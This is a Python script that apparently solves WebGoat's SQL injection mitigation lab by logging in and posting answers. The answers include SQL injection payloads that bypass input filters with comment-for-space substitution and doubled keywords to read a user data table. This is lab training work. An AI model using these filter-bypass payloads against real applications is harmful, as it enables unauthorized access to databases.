import requests

HOST_IP = "__HOST_IP__"  # Set target host's IP address
USERNAME = "__USERNAME__"  # Set WebGoat account USERNAME
PASSWORD = "__PASSWORD__"  # Set WebGoat account PASSWORD
BASE_URL = f"http://{HOST_IP}:8080/WebGoat"

s = requests.Session()


s.headers.update(
    {
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "sq-AL,sq;q=0.9,en-US;q=0.8,en;q=0.7",
        "Cache-Control": "max-age=0",
        "Connection": "keep-alive",
        "Host": f"{HOST_IP}:8080",
        "Origin": f"http://{HOST_IP}:8080",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    }
)

s.post(
    f"{BASE_URL}/login",
    headers={
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Referer": f"{BASE_URL}/login",
    },
    data={"USERNAME": USERNAME, "PASSWORD": PASSWORD},
)

endpoints = [
    "welcome.mvc", "start.mvc", "service/labels.mvc", "service/lessonmenu.mvc",
    "WebGoatIntroduction.lesson.lesson", "service/lessoninfo.mvc", "service/lessonoverview.mvc",
    "service/hint.mvc", "SqlInjectionMitigations.lesson.lesson"
]

for endpoint in endpoints:
    s.get(f"{BASE_URL}/{endpoint}")

attacks = [
    ("SqlInjectionMitigations/attack10a", {
        "field1": "getConnection",
        "field2": "PreparedStatement",
        "field3": "prepareStatement",
        "field4": "?",
        "field5": "?",
        "field6": "ps.setString(1, 'user')",
        "field7": "ps.setString(2, 'mail')",
    }),
    ("SqlInjectionMitigations/attack10b", {
    "editor": """try { 
        Connection conn = DriverManager.getConnection(DBURL, DBUSER, DBPW);
        PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE name = ?");
        ps.setString(1, "Admin"); 
        ps.executeUpdate(); 
    } catch (Exception e) { 
        System.out.println("Oops. Something went wrong!"); 
    }"""
    }),
    ("SqlOnlyInputValidation/attack", {
        "userid_sql_only_input_validation": "a';/**/select/**/*/**/from/**/user_system_data;--"
    }),
    ("SqlOnlyInputValidationOnKeywords/attack", {
        "userid_sql_only_input_validation_on_keywords": "a';/**/seselectlect/**/*/**/frfromom/**/user_system_data;--"
    }),
    ("SqlInjectionMitigations/attack12a", {"ip": "104.130.219.202"}),
]

for endpoint, data in attacks:
    r = s.post(f"{BASE_URL}/{endpoint}", headers={"Accept": "*/*", "Origin": f"http://{HOST_IP}:8080"}, data=data)
    print(f"Attempted {endpoint}: {r.status_code}\nText returned: {r.text}")
